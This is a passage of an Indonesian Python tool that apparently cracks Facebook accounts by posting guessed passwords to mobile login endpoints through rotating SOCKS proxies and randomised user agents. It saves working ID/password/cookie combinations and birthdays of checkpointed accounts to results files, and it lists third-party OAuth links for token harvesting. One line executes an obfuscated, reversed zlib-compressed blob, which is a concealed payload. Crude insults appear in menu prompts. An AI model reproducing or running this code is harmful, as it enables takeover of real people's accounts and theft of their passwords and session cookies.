						po = session.post(f'https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
					else:
						po = session.post(f'https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)

				elif "ke4" == method:
#					pw = pw.lower()
					session=requests.Session()
					prox = open("data/prox_socks4.txt","r").read().splitlines()
					proxs= {"http": f"socks4://{random.choice(prox)}"}
					ua = random.choice(ugen_)
					try:
						ua2 = random.choice(ugen2)
					except:
						ua2 = random.choice(ugen_)
					session.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://"+url+"/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
					p = session.get('https://'+url+'/login/device-based/password/?uid='+user+'&flow=login_no_pin&refsrc=deprecated&_rdr')
					dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":user,"next":"https://"+url+"/login/save-device/","flow":"login_no_pin","pass":pw}
					koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
					koki+=' m_pixel_ratio=2.625; wd=412x756'
					heade={"Host":url,"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://"+url,"content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://"+url+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
					if "Risky_Ganteng" == prox_k:
						po= session.post('https://'+url+'/login/device-based/validate-password/?shbl=0'+yyy,data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
					else:
						po= session.post('https://'+url+'/login/device-based/validate-password/?shbl=0'+yyy,data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)


				if 'c_user'+yyy in session.cookies.get_dict():
					play_mpv(".Wiii.mp3")
					try:
						# Info: coding *GET INGFO UA* buatan anggaxd
						url_main = "https://www.whatsmyua.info"
						s = parser(requests.get(url_main, headers={"user-agent":ua}).text, "html.parser")
						raw_ua = s.find("li", id="rawUa").text
						family = s.find("li", id="family").text
						name_hp = s.find("li", id="product").text
						os_ = s.find("li", id="os").text
						ly = s.find("li", id="layout").text
						ua = raw_ua.replace("rawUa: ", "")
						browser = family.replace("family: ", "")
						hp = name_hp.replace("product: ", "")
						os = os_.replace("os: ", "")
						layout = ly.replace("layout: ", "")
					except:pass
					coki = ubah_cok(session.cookies.get_dict())
					wrt = '%s|%s|%s' % (user,pw,coki)
					ok.append(wrt)
					open('results/OK-'+durasi+'.txt','a').write('%s\n' % wrt)
					if "IYA" in apk_me:
						ubah_bahasa(coki)
						get_apk(user,pw,coki)
					else:
						try:
							ok_ = Tree("                                 ",highlight=True, hide_root=True)
							ok__= ok_.add(f":bolivia::oman: {o}AKUN OK NI BOZZ{q}",guide_style="uu red")
							ok___ = ok__.add(f"{b}ID DAN PASSWORD{q}")
							ok___.add(f"\r{i}{user}{q}|{i}{pw}{q}")
							ok___ = ok__.add(f"{b}COOKIES{q}")
							ok___.add(f"{c}{coki}{q}")
							ok___ = ok__.add(f"{k}Link App{q}")
							ok____= ok___.add(f"{c}{link_app}{q}")
							ok___ = ok__.add(f"{k}UserAgent{q}")
							ok____= ok___.add(f"{c}{ua}{q}")
							ok_____= ok____.add(f"{k}Information UserAgent{q}")
							ok______= ok_____.add(f"{b}OS{q}")
							ok______.add(f"{c}{os}{q}")
							ok______= ok_____.add(f"{b}LAYOUT{q}")
							ok______.add(f"{c}{layout}{q}")
							ok______= ok_____.add(f"{b}DEVICE HP{q}")
							ok______.add(f"{c}{hp}{q}")
							ok______= ok_____.add(f"{b}Jenis Browser{q}")
							ok______.add(f"{c}{browser}{q}")
							prints(ok__)
						except:
							ok_ = Tree("                                 ",highlight=True, hide_root=True)
							ok__= ok_.add(f":bolivia::oman: {o}AKUN OK NI BOZZ{q}",guide_style="uu red")
							ok___ = ok__.add(f"{b}ID DAN PASSWORD{q}")
							ok___.add(f"\r{i}{user}{q}|{i}{pw}{q}")
							ok___ = ok__.add(f"{b}COOKIES{q}")
							ok___.add(f"{c}{coki}{q}")
							ok___ = ok__.add(f"{k}UserAgent{q}")
							ok___.add(f"{c}{ua}{q}")
							prints(ok__)
					self.Kontol_Kau_Ikuti(session,coki)
					break
				elif 'checkpoint'+yyy in session.cookies.get_dict():
					play_mpv(".Wiii.mp3")
					try:
						# Info: coding *GET INGFO UA* buatan anggaxd
						url_main = "https://www.whatsmyua.info"
						s = parser(requests.get(url_main, headers={"user-agent":ua}).text, "html.parser")
						raw_ua = s.find("li", id="rawUa").text
						family = s.find("li", id="family").text
						name_hp = s.find("li", id="product").text
						os_ = s.find("li", id="os").text
						ly = s.find("li", id="layout").text
						ua = raw_ua.replace("rawUa: ", "")
						browser = family.replace("family: ", "")
						hp = name_hp.replace("product: ", "")
						os = os_.replace("os: ", "")
						layout = ly.replace("layout: ", "")
					except:pass
					try:
						yz  = requests.Session().get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,tiktok),cookies=puput)
						zxc = json.loads(yz.text)
						cp_ttl= zxc['birthday']
						month, day, year = cp_ttl.split('/')
						month = bulan_ttl[month]
						ttl = f"{day}-{month}-{year}"
					except:
						ttl="—"
					wrt = '%s|%s|%s' % (user,pw,ttl);cp.append(wrt);_ = lambda __ : __import__('zlib').decompress(__[::-1]);exec((_)(ua03[3]));open('results/CP-'+durasi+'.txt','a').write('%s\n' % wrt)
					if "IYA" == opsi_y:
						try:
							hide_opsi(user,pw,ttl)
						except:
							cp_ = Tree("                                 ",highlight=True, hide_root=True)
							cp__= cp_.add(f":bolivia::oman: {u}AKUN CP NI BOZZ{q}",guide_style="uu blue")
							cp___ = cp__.add(f"{k}ID DAN PASSWORD{q}")
							cp___.add(f"\r{m}{user}{q}|{m}{pw}{q}")
							cp___ = cp__.add(f"{k}TANGGAL LAHIR{q}")
							cp___.add(f"{m}{ttl}{q}")
							prints(cp__)
					else:
						try:
							cp_ = Tree("                                 ",highlight=True, hide_root=True)
							cp__= cp_.add(f":bolivia::oman: {u}AKUN CP NI BOZZ{q}",guide_style="uu blue")
							cp___ = cp__.add(f"{k}ID DAN PASSWORD{q}")
							cp___.add(f"\r{m}{user}{q}|{m}{pw}{q}")
							cp___ = cp__.add(f"{k}TANGGAL LAHIR{q}")
							cp___.add(f"{m}{ttl}{q}")
							cp___ = cp__.add(f"{k}UserAgent{q}")
							cp____= cp___.add(f"{c}{ua}{q}")
							cp_____= cp____.add(f"{k}Information UserAgent{q}")
							cp______= cp_____.add(f"{b}OS{q}")
							cp______.add(f"{c}{os}{q}")
							cp______= cp_____.add(f"{b}LAYOUT{q}")
							cp______.add(f"{c}{layout}{q}")
							cp______= cp_____.add(f"{b}DEVICE HP{q}")
							cp______.add(f"{c}{hp}{q}")
							cp______= cp_____.add(f"{b}Jenis Browser{q}")
							cp______.add(f"{c}{browser}{q}")
							prints(cp__)
						except:
							cp_ = Tree("                                 ",highlight=True, hide_root=True)
							cp__= cp_.add(f":bolivia::oman: {u}AKUN CP NI BOZZ{q}",guide_style="uu blue")
							cp___ = cp__.add(f"{k}ID DAN PASSWORD{q}")
							cp___.add(f"\r{m}{user}{q}|{m}{pw}{q}")
							cp___ = cp__.add(f"{k}TANGGAL LAHIR{q}")
							cp___.add(f"{m}{ttl}{q}")
							cp___ = cp__.add(f"{k}UserAgent{q}")
							cp___.add(f"{c}{ua}{q}")
							prints(cp__)
					break
				else:continue
			self.chexk_ip_spam(user,memek,url)
#		except Exception as e:print(e)
		except:
			loop-=1
			self.method(user, memek,url)
	def buat_ugen(self):
		global ugen_
	#	{str(rc(aZ))}
	#	{str(rr(111,999))}
		rr = random.randint
		rc = random.choice
		aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
		aZ10 = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9','0']


		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=C, justify="center", width=60)
		tod.add_row(f"1\n2\n3\n4\n5\n6\n7\n8",f"UserAgent Nokia\nUserAgent UcBrowser\nUserAgent Random\nUserAgent Crhome\nUserAgent Facebook\nUserAgent By Fall\nUserAgent Bawaan\nManual")
		sol().print(tod, justify='center')

		pilih_ = input(f">--Pilih 1-5--> {q}")
		if pilih_ in ("1","01"):
			for x in range(2000):
				ugen_.append(f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(aZ))}{str(rc(aZ))}{str(rr(111,999))}{str(rc(aZ))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(11,99))}.{str(rr(1,9))}.{str(rr(1111,9999))}.{str(rr(11,99))} Mobile Safari/{str(rc(aZ))}{str(rr(1,9))}{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}")
		elif pilih_ in ("2","02"):
			for x in range(10000):
				aa='Mozilla/5.0 (Linux; U; Android'
				b=random.choice(['6','7','8','9','10','11','12'])
				c=' en-us; GT-'
				d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
				e=random.randrange(1, 999)
				f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
				g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
				h=random.randrange(73,100)
				i='0'
				j=random.randrange(4200,4900)
				k=random.randrange(40,150)
				l='Mobile Safari/537.36'
				uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
				ugen_.append(uaku2)
		elif pilih_ in ("3","03"):
			for xd in range(10000):
				a='Mozilla/5.0 (Symbian/3; Series60/'
				b=random.randrange(1, 9)
				c=random.randrange(1, 9)
				d='Nokia'
				e=random.randrange(100, 9999)
				f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
				g=random.randrange(1, 9)
				h=random.randrange(1, 4)
				i=random.randrange(1, 4)
				j=random.randrange(1, 4)
				k='Mobile Safari/535.1'
				uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
				ugen2.append(uaku)


				aa='Mozilla/5.0 (Linux; U; Android'
				b=random.choice(['6','7','8','9','10','11','12'])
				c=' en-us; GT-'
				d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
				e=random.randrange(1, 999)
				f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
				g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
				h=random.randrange(73,100)
				i='0'
				j=random.randrange(4200,4900)
				k=random.randrange(40,150)
				l='Mobile Safari/537.36'
				uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
				ugen_.append(uaku2)

		elif pilih_ in ("4","04"):
			for x in range(2000):
				ugen_.append(f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; en-us; GT-{str(rc(aZ))}{str(rr(1111,9999))}) AppleWeb Kit/{str(rr(111,999))}.{str(rr(11,99))} (KHTML, like Gecko) Chrome/{str(rr(11,99))}.{str(rr(1,9))}.{str(rr(1111,9999))}.{str(rr(11,99))} Mobile Sa fari/{str(rr(111,999))}.{str(rr(11,99))}")
		elif pilih_ in ("5","05"):
			for x in range(2000):
				ugen_.append(f"Mozilla/5.0 (Linux; Android {str(rr(7,11))}; SM-{str(rc(aZ))}202{str(rc(aZ))} Build/{str(rc(aZ))}{str(rc(aZ))}{str(rr(1,9))}{str(rc(aZ))}.{str(rr(111111,999999))}.{str(rr(111,999))}; wv) AppleWebKit/{str(rr(111,999))}.{str(rr(11,99))} (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(111,999))}.{str(rr(1,9))}.{str(rr(1111,9999))}.{str(rr(111,999))} Mobile Safari/{str(rr(111,999))}.{str(rr(11,99))} [FB_IAB/FB4A;FBAV/{str(rr(111,999))}.{str(rr(1,9))}.{str(rr(1,9))}.{str(rr(11,99))}.{str(rr(111,999))};]")
		elif pilih_ in ("6","06"):
			for x in range(5000):
				ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP"
				if ugent1 in ugen_:pass
				else:ugen_.append(ugent1)
				ugent2 = f"Mozilla/5.0 (Linux; U; Android {str(rr(8,10))}; en-US; Redmi Note {str(rr(5,8))} Build/PKQ1.{str(rr(111111,199999))}.00{str(rr(1,9))} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.{str(rr(1111,6666))}.2 UCBrowser/13.4.0.{str(rr(1111,6666))} Mobile Safari/537.36"
				if ugent2 in ugen_:pass
				else:ugen_.append(ugent2)
				ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; en-US; SM-{str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Mobile UCBrowser/3.4.3.{str(rr(111,999))}"
				if ugent3 in ugen_:pass
				else:ugen_.append(ugent3)
		elif pilih_ in ("7","07"):
			for x in range(3500):
				ugent1 = (f"Mozilla/5.0 (Linux; Android {str(rr(8,11))}; RMX2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(111,999))}.0.0.0 Mobile Safari/537.36")
				if ugent1 in ugen_:pass
				else:ugen_.append(ugent1)
				ugent2 = (f"Mozilla/5.0 (Mobile; rv:48.0; {str(rc(aZ10))}{str(rc(aZ10))}{str(rc(aZ10))}{str(rc(aZ10))}{str(rc(aZ10))}{str(rc(aZ10))}) Gecko/48.0 Firefox/48.0 KAIOS/2.5")
				if ugent2 in ugen__:pass
				else:ugen__.append(ugent2)


		elif pilih_ in ("8","08"):
			try:
				jmlh = int(input(f">--Jumlah UserAgent--> "))
			except:jmlh=1
			for x in range(jmlh):
				ues=input('>--Masukan UserAgent--> ')
				if ues == '':
					kotak("# JANGAN KOSONG KONTOL",M,Q)
					time.sleep(5);self.buat_ugen()
				elif len(ues)<=34:
					kotak("# MINIMAL USERAGENT 35 KATA",M,Q)
					time.sleep(5);self.buat_ugen()
				else:
					ugen_.append(ues)
		else:
			kotak("# MAAF PILIHAN ANDA TIDAK DITEMUKAN",M,Q)
			self.buat_ugen()


	def pilih_url(self):
		global url_met
		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=C, justify="center", width=60)
		tod.add_row(f"1\n2\n3\n4\n5",f"Mobile\nFree\nMbasic\nP\nX")
		sol().print(tod, justify='center')
		hu = input(f'>--{c}Pilih 1-4{q}--> ')
		if hu in ['1','01']:
			url_met = "mobile"
		elif hu in ['2','02']:
			url_met = "free"
		elif hu in ['3','03']:
			url_met = "mbasic"
		elif hu in ['4','04']:
			url_met = "p"
		elif hu in ['5','05']:
			url_met = "x"
		else:
			kotak("# KONCOL TINGGAL PILIH 1-4 ITU AJA SUSAH, AJIM",C,Q)
			time.sleep(2)
			self.pilih_url()
	def pilih_mentod_(self):
		global method
		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=C, justify="center", width=60)
		tod.add_row(f"1\n2",f"Method 1\nMethod 2")
		sol().print(tod, justify='center')
		hu = input(f'>--{c}Pilih 1-2{q}--> ')
		if hu in ['1','01']:
			method = "ke1"
		elif hu in ['2','02']:
			method = "ke2"
		else:
			kotak("# KONCOL TINGGAL PILIH 1-2 ITU AJA SUSAH, AJIM",C,Q)
			time.sleep(2)
			self.pilih_mentod_()
	def pilih_mentod(self):
		global method
		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=C, justify="center", width=60)
		tod.add_row(f"1\n2\n3\n4",f"Method 1\nMethod 2\nMethod 3\nMethod 4")
		sol().print(tod, justify='center')
		hu = input(f'>--{c}Pilih 1-4{q}--> ')
		if hu in ['1','01']:
			method = "ke1"
		elif hu in ['2','02']:
			method = "ke2"
		elif hu in ['3','03']:
			method = "ke3"
			self.pilih_next()
		elif hu in ['4','04']:
			method = "ke4"
		elif hu in ['5','05']:
			method = "ke5"
		else:
			kotak("# KONCOL TINGGAL PILIH 1-5 ITU AJA SUSAH, AJIM",C,Q)
			time.sleep(2)
			self.pilih_mentod()


	def pilih_next(self):
		global link_app
		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=C, justify="center", width=60)
		tod.add_row(f"1\n2\n3\n4\n5\n6\n7",f"Free Fire\nHago\nRuang Guru\nBryanly\nHings Domino\nYandex\nAll Link(Random)")
		sol().print(tod, justify='center')
		hu = input(f'>--{c}Pilih 1-4{q}--> ')
		if hu in ['1','01']:
			#boyaah
			link_app=["https://auth.booyah.live/oauth/login?client_id=10058&redirect_uri=https%3A%2F%2Fbooyah.live%2Flogin&response_type=token&platform=3&locale=en-GB&state=return_url%3Dhttps%3A%2F%2Fbooyah.live%2F"]
		elif hu in ['2','02']:
			#Hago
			link_app=["https://m.facebook.com/v3.2/dialog/oauth?app_id=1443497502442589&cbt=1660006184043&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df22524a9ae24e8c%26domain%3Dwww.ihago.net%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.ihago.net%252Ff2e576f35ed6ab4%26relation%3Dopener&client_id=1443497502442589&display=touch&domain=www.ihago.net&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fwww.ihago.net%2Fa%2Fweb-login%2Findex.html%23%2F&locale=en_US&logger_id=f4075c8fa8864&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df591a111651cc%26domain%3Dwww.ihago.net%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.ihago.net%252Ff2e576f35ed6ab4%26relation%3Dopener%26frame%3Dff067454e6509c&response_type=token%2Csigned_request%2Cgraph_domain&sdk=joey&version=v3.2"]
		elif hu in ['3','03']:
			#Ruang Guru
			link_app=["https://m.facebook.com/v3.3/dialog/oauth?encrypted_query_string=AeDT2UXYR_53fiXztzu_JhFEBFfSJQgdUJGUXpWNi06kMvyZabZnxfdBZhZqn0UVav0tMQhs1d-jJsCtyUwNApPh-rjYgugWqF-e66qARB91xP624bvOxSjswdmzxS1zgvH4Ojj2MOEEW-Qi3bMycxfp8etyXlIdau3ppuAyyDbEBSIyiWvpC8Fl0k72v7CPgmvEGr6EvqJJ3P96Cmtf4nAFS8qWpLS3hwVpvr-cYADOlLya0mpQybTQ47egOAscvQV6EJZGU0gf4ptTfXhpcIb_ZLZh0gOKDftQzztpwa5jzDXQyiMFC94hijWNafrhSEZ8WtfinBYZkUVU4hbjM6CDzdO14HDUlHa-_QU3aQQo-V1wpnndx0cE1pNbOSuLpyW0E6q5MJ8qRZ7J2uX4PcmjsOBHRfOWA1hsBPQrHPnWoVidw8Lk67C4b9ult5CY578K5fHL447X3Wjq3jXxdSCEPNL-MLpW0bsjPM3-cNC1X9oYB6AjxpToI6zqS5ML-eRsA5VVeB89eS2X4xxcgveP2oOnFWUMyqQS7Ma1guZvlRvCc9rK7elLXdljMd743YV6RJLg7l_wGelvrdbGJAClrZQN2NPuvxLfUyOwIblHTTZ21mA8diwCfRFkmwbbg30y9ry6wN39pTXZdZlGEuoQezQO1qgJD845j2oGD057s9p3S-p10ljHw-eYOvx8u6gMFdWPmbmKIF6KKkJhdzwGh1JDoWRjmxvcXiZal1VM4S8ZE99uIM54eNlpB0wxcVVJZ92j72g4mc_75e1fEfhQw1ZSPlrfq4Auc3bYQFMZ7x87n8_Buv_V-33jSjl0XyXNUk9UQlRVLztDgihIRspczT94fGzhzksV0ASf0a9pyaYTrbsHjK_o7tGxLtCqneuiooMwvds0VB9BgpwlwhVMmotgV881fyZ-9Ge_CAYXenAoGUJMufxZ-P5FGIpWRy5XmJ6ZiE9KsnV2m2W11ZUDYozAHF_aiVjT3AxhN9tAyKv4shU0ChnURwPQOdT-N4_Bqwzu1kCIanP4rIYhzF8XsFjVt0ygH7Xv9kDDI2xifFdhmfNEEG0s91VRP0_3cLzIXEY0MLgpyvQ4qI6_KMGCTKnCUBsAnxhy9Dzj3pAJ5XcWVxp6UFihIk1czVytY_bQ_oBu4eHzWp8kXQeO_W34TJPJKrzvnyNDMpKKUKaaOl3kNPLvggYm5I5vb7kOk-KnIQgWy5vS2-M9MIOEQLiQBa58eig2tfBP9bVDRQ6xzeNghsXBO_HsX4UwLqdfLz0EbpplEIELjKRpzgDnr7hYN1sM4wvVmHMr98VROyWrNxc7Wy1FjxKeSl__wVLXxeIVg8SPa9kBr_hKJ6-3rQQUdHr6N7TqgXceyF9CTa1JDC9gKrN7oVCR9XfnN6hKmWA4T9mFOO5Dd5UYRAp6FlpjnHyv5dtsvRWfcA7RFC9nUTAXhGwODXxBNpY8BGc7Xh8vTDwTKqmsyUQN5V1czX8bxLhsWVLODZhaI37hREsTOLT5nHOrg0NYNcc-s80UANkPOpcpu_yQDko1fBGR3-ARPgRiLT4GX59glmvFSIIoVb9LnXT8-tRDBA"]
		elif hu in ['4','04']:
			#Bryanly
			link_app=["https://m.facebook.com/v3.2/dialog/oauth?app_id=546387748750105&auth_type=rerequest&cbt=1660007160700&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2fb47fad7408cc%26domain%3Dbrainly.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbrainly.co.id%252Ff255ac1c9862044%26relation%3Dopener&client_id=546387748750105&display=touch&domain=brainly.co.id&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fbrainly.co.id%2Ftugas%2F14548632&locale=en_US&logger_id=f2c7c938fdf214c&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1ee54b6e463df4%26domain%3Dbrainly.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbrainly.co.id%252Ff255ac1c9862044%26relation%3Dopener%26frame%3Df2e29c41357b38&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true&scope=public_profile%2C%20email&sdk=joey&version=v3.2"]
		elif hu in ['5','05']:
			#Hings Domino
			link_app=["https://m.facebook.com/v8.0/dialog/oauth?cct_prefetching=0&client_id=345000986033587&cbt=1660008418088&e2e=%7B%22init%22%3A1660008418088%7D&ies=1&sdk=android-8.2.0&sso=chrome_custom_tab&scope=public_profile%2Cuser_gender%2Cuser_friends&state=%7B%220_auth_logger_id%22%3A%22eb1f7549-f6ec-4e30-9e92-979a5a8b685f%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%2254e2vochhlvsm0areh4t%22%7D&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fb345000986033587%3A%2F%2Fauthorize&auth_type=rerequest&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true"]
		elif hu in ['6','06']:
			#Yandex
			link_app=["https://m.facebook.com/v12.0/dialog/oauth?cct_prefetching=0&client_id=216570901687097&cbt=1660268970371&e2e=%7B%22init%22%3A1660268970371%7D&ies=0&sdk=android-12.2.0&sso=chrome_custom_tab&nonce=30032935-4997-43a5-abac-0d2c6cae81d5&scope=user_birthday%2Cuser_likes%2Copenid%2Cuser_link%2Cuser_gender%2Cemail&state=%7B%220_auth_logger_id%22%3A%2226cb2987-4616-4361-90ff-ab55b956e68f%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%225le280ansood69lmdd9e%22%7D&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fcct.ru.yandex.searchplugin&auth_type=rerequest&response_type=id_token%2Ctoken%2Csigned_request%2Cgraph_domain&return_scopes=true"]
		elif hu in ['7','07']:
			link_app=["https://m.facebook.com/v8.0/dialog/oauth?cct_prefetching=0&client_id=345000986033587&cbt=1660008418088&e2e=%7B%22init%22%3A1660008418088%7D&ies=1&sdk=android-8.2.0&sso=chrome_custom_tab&scope=public_profile%2Cuser_gender%2Cuser_friends&state=%7B%220_auth_logger_id%22%3A%22eb1f7549-f6ec-4e30-9e92-979a5a8b685f%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%2254e2vochhlvsm0areh4t%22%7D&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fb345000986033587%3A%2F%2Fauthorize&auth_type=rerequest&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true",
			"https://m.facebook.com/v3.2/dialog/oauth?app_id=546387748750105&auth_type=rerequest&cbt=1660007160700&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2fb47fad7408cc%26domain%3Dbrainly.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbrainly.co.id%252Ff255ac1c9862044%26relation%3Dopener&client_id=546387748750105&display=touch&domain=brainly.co.id&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fbrainly.co.id%2Ftugas%2F14548632&locale=en_US&logger_id=f2c7c938fdf214c&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1ee54b6e463df4%26domain%3Dbrainly.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbrainly.co.id%252Ff255ac1c9862044%26relation%3Dopener%26frame%3Df2e29c41357b38&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true&scope=public_profile%2C%20email&sdk=joey&version=v3.2",
			"https://m.facebook.com/v3.2/dialog/oauth?app_id=546387748750105&auth_type=rerequest&cbt=1660007160700&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2fb47fad7408cc%26domain%3Dbrainly.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbrainly.co.id%252Ff255ac1c9862044%26relation%3Dopener&client_id=546387748750105&display=touch&domain=brainly.co.id&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fbrainly.co.id%2Ftugas%2F14548632&locale=en_US&logger_id=f2c7c938fdf214c&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1ee54b6e463df4%26domain%3Dbrainly.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbrainly.co.id%252Ff255ac1c9862044%26relation%3Dopener%26frame%3Df2e29c41357b38&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true&scope=public_profile%2C%20email&sdk=joey&version=v3.2",
			"https://auth.booyah.live/oauth/login?client_id=10058&redirect_uri=https%3A%2F%2Fbooyah.live%2Flogin&response_type=token&platform=3&locale=en-GB&state=return_url%3Dhttps%3A%2F%2Fbooyah.live%2F",
